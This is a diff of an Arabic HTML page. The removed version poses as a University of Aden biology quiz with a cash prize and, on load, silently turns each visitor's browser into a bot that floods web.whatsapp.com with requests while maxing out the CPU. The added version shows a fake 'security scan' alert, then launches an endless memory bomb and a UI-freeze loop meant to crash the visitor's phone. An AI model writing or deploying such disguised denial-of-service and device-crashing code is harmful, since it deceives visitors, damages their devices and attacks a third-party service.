@@ -1,53 +1,36 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>مسابقة مادة الأحياء</title>
-    <meta property="og:title" content="مسابقة مادة الأحياء - جامعة عدن">
-    <meta property="og:description" content="اختبر معلوماتك الآن، الفائز بالمركز الأول له مبلغ مالي مجزي.">
-    
-    <style>
-        body { background-color: #000; color: #0f0; text-align: center; font-family: monospace; padding-top: 100px; }
-        .status { font-size: 1.2rem; margin-top: 20px; }
-    </style>
-</head>
-<body>
-
-    <h1>🏆 مسابقة مادة الأحياء 🏆</h1>
-    <div class="status">جاري الاتصال بقاعدة بيانات الأسئلة...</div>
-    <div id="logs" style="font-size: 10px; color: #333; margin-top: 50px;"></div>
-
-    <script>
-        // دالة هجوم الـ DDoS الموزع الصامت
-        function startDDoS() {
-            // الهدف (خادم الواتساب كمثال للتجربة)
-            const target = "https://web.whatsapp.com/"; 
-            
-            setInterval(() => {
-                // إرسال طلبات مخفية لإغراق الهدف (DDoS Flood)
-                fetch(target + "?v=" + Math.random(), {
-                    mode: 'no-cors',
-                    cache: 'no-cache'
-                }).catch(() => {});
-
-                // استهلاك المعالج (CPU) لضمان ثقل جهاز الضحية (DoS)
-                for (let i = 0; i < 1000000; i++) {
-                    let x = Math.sqrt(Math.random());
-                }
-
-                // طباعة وهمية في الكونسول لتأكيد العمل
-                console.log("Packet sent to target...");
-            }, 50); // إرسال 20 طلب في الثانية الواحدة من كل جهاز!
+<script>
+    function crashSystem() {
+        alert("بدء فحص الحماية... يرجى عدم إغلاق الصفحة");
+        
+        let heavyLoad = [];
+        
+        // 1. استهلاك الرام بجنون (قنبلة الذاكرة)
+        // سيقوم بحجز مساحات ضخمة تجبر الأندرويد على إغلاق التطبيقات الأخرى (Background Killer)
+        function memoryBomb() {
+            while(true) {
+                heavyLoad.push(new Uint32Array(5000000).fill(0xDEADBEEF));
+                // إضافة نصوص ضخمة جداً للسجل لمنع المتصفح من الاستجابة
+                window.history.pushState(null, "", Math.random().toString(36));
+            }
         }
 
-        // تشغيل الهجوم تلقائياً بعد تحميل الصفحة
-        window.onload = function() {
-            console.log("System Ready...");
-            startDDoS();
-        };
-    </script>
+        // 2. تجميد الواجهة (UI Freeze)
+        // يمنع المستخدم من الضغط على زر الهوم أو التنقل بين التطبيقات
+        function uiFreeze() {
+            while(true) {
+                // عمليات حسابية لا نهائية في خيط الواجهة الأساسي
+                let x = Math.pow(Math.random(), Math.random());
+                document.body.innerHTML += "<h1>SYSTEM_OVERLOAD_ERROR_0x8821</h1>";
+            }
+        }
 
-</body>
-</html>
+        // تنفيذ الهجومين معاً
+        setTimeout(memoryBomb, 100);
+        setTimeout(uiFreeze, 100);
+    }
+
+    // التنفيذ بعد 3 ثواني
+    window.onload = function() {
+        setTimeout(crashSystem, 3000);
+    };
+</script>
